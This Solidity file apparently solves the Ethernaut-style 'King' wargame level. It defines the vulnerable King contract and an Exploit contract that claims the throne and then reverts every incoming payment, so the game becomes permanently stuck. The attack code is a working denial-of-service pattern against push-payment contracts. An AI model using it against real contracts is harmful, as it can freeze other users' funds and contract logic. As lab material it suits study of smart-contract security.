// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
contract Exploit is Destructible, Targeted {
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function exploit() public payable {
      King target = King(payable(Targeted(this).target()));
      payable(target).call{value: msg.value}("");
      require(target._king() == address(this), "Exploit: I am not the king");
  }
  receive() external payable {
    revert("Exploit: receive() is not payable, no king for you");
  }
}